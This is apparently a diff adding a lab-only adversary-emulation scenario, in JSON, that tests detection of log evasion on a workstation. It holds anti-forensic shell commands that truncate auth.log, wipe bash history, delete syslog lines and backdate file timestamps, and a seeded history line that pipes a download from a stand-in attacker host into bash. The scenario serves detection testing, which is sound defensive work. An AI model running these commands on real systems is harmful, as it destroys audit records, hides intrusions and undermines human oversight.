@@ -1,0 +1,58 @@
+{
+  "scenario_id": "log_evasion_001",
+  "name": "Log Evasion Chain — History Clear, Syslog Tamper, Timestamp Drift",
+  "class_name": "defense_evasion",
+  "mode": "lab_only",
+  "risk_level": "critical",
+  "hosts": ["workstation-1"],
+  "preconditions": ["telemetry collector active", "victim_logs bind-mounted"],
+  "behavior_profile": {
+    "log_seed": true,
+    "log_evasion": true,
+    "cleanup": true
+  },
+  "custom_behaviors": {
+    "log_seed": [
+      {"step_id": "write_auth_entries", "command": "for i in 1 2 3 4 5; do echo \"$(date -u '+%Y-%m-%dT%H:%M:%SZ') victim sshd[$$]: Accepted password for admin from 10.0.0.$i port 224$i ssh2\" >> /var/log/auth.log; done"},
+      {"step_id": "write_syslog_entries", "command": "for i in 1 2 3; do echo \"$(date -u '+%b %d %H:%M:%S') victim kernel: [1234.5$i] iptables DROP IN=eth0 SRC=192.168.1.$i\" >> /var/log/syslog 2>/dev/null || true; done"},
+      {"step_id": "write_bash_history", "command": "echo 'curl http://evil.example.com/payload.sh | bash' >> /root/.bash_history 2>/dev/null || echo 'curl...' >> /tmp/ClawdianShield/fake_history.txt"}
+    ],
+    "log_evasion": [
+      {"step_id": "history_clear", "command": "cat /dev/null > /root/.bash_history 2>/dev/null || truncate -s 0 /tmp/ClawdianShield/fake_history.txt"},
+      {"step_id": "auth_log_truncate", "command": "truncate -s 0 /var/log/auth.log 2>/dev/null || echo '[evasion] auth.log cleared' > /tmp/ClawdianShield/evasion_receipt.txt"},
+      {"step_id": "syslog_line_delete", "command": "grep -v 'iptables DROP' /var/log/syslog > /tmp/ClawdianShield/syslog_clean.tmp 2>/dev/null && mv /tmp/ClawdianShield/syslog_clean.tmp /var/log/syslog 2>/dev/null || true"},
+      {"step_id": "timestamp_drift", "command": "touch -t 202001010000 /var/log/auth.log 2>/dev/null || true"},
+      {"step_id": "shred_artifact", "command": "dd if=/dev/zero bs=1k count=4 of=/tmp/ClawdianShield/zero_fill.bin 2>/dev/null && rm -f /tmp/ClawdianShield/zero_fill.bin"}
+    ]
+  },
+  "custom_behavior_techniques": {
+    "log_seed": "T1059.004",
+    "log_evasion": "T1070.003"
+  },
+  "custom_behavior_produces": {
+    "log_seed": ["file_events", "auth_events"],
+    "log_evasion": ["file_events", "timeline_reconstruction"]
+  },
+  "expected_telemetry": {
+    "file_events": true,
+    "auth_events": true,
+    "timeline_reconstruction": true
+  },
+  "detections_expected": [
+    "auth_log_cleared",
+    "bash_history_wiped",
+    "timestamp_manipulation_detected",
+    "log_line_deletion_pattern"
+  ],
+  "success_criteria": [
+    "auth.log truncation generates file_modify event",
+    "timestamp touch generates file_events with metadata drift",
+    "dd zero-fill + delete produces file_create + file_delete pair"
+  ],
+  "safety_constraints": {
+    "lab_environment_only": true,
+    "no_real_exploit_logic": true,
+    "no_real_credential_attack_logic": true,
+    "no_unapproved_network_spread": true
+  }
+}
